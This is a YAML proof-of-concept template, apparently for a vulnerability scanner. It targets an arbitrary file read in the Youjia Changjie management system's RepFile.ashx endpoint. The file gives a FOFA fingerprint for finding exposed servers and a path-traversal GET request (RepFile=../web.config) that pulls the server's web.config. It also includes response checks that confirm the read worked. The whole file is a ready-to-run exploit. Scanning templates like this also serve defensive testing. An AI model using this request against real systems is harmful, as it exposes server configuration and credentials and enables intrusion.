id: poc-yaml-youjiasoft-repfile-ashx-anyfile-read
info:
  name: 友加畅捷管理系统 RepFile.ashx 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 友加畅捷管理系统
  fofa: icon_hash="2049187099"
requests:
- method: GET
  path: /ReportDesign/RepFile.ashx?Type=ReadReportCpfFile&RepFile=../web.config
  expression: status_code == 200 && contains(body,"</system.web>") && contains(body,"<configuration>")
    && contains(body,"<webServices>") && contains(body,"youjiasoft")
variables: {}
transport: http
